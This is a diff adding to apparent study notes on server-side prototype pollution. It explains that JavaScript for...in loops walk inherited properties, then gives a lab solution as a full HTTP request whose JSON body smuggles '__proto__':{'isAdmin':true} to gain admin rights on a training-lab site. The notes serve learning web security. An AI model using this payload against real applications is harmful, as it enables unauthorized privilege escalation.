@@ -418,5 +418,41 @@ Object.defineProperty(config, 'transport_url', {configurable: false, writable: f
 
 - Detecting server-side prototype pollution via polluted property reflection
 
+- An easy trap for developers to fall into is forgetting or overlooking the fact that a JavaScript for...in loop iterates over all of an object's enumerable properties, including ones that it has inherited via the prototype chain.E.g
+  
+<img width="1072" height="456" alt="image" src="https://github.com/user-attachments/assets/5b2064f4-e867-4234-812c-ac3c27ba4b48" />
+
+- This also applies to arrays, where a for...in loop first iterates over each index, which is essentially just a numeric property key under the hood, before moving on to any inherited properties as well.
+
+<img width="1049" height="356" alt="image" src="https://github.com/user-attachments/assets/debf59e1-cb7b-4ff9-a65d-b6a301e8edb5" />
+
+- Lab-: Privilege Escalation with Server-Side pollution-:
+- Solution-:
+
+```http
+POST /my-account/change-address HTTP/2
+Host: 0a80008a04aab2458188702000950037.web-security-academy.net
+Cookie: session=RpBd2708AlwcHGnQTiusLdpPJW5z02B1
+Content-Length: 168
+Sec-Ch-Ua-Platform: "Linux"
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Brave";v="140"
+Content-Type: application/json;charset=UTF-8
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Sec-Gpc: 1
+Accept-Language: en-US,en;q=0.8
+Origin: https://0a80008a04aab2458188702000950037.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0a80008a04aab2458188702000950037.web-security-academy.net/my-account
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"RpBd2708AlwcHGnQTiusLdpPJW5z02B1","__proto__":{"isAdmin":true}}
+```
+
+
 
 -----------------
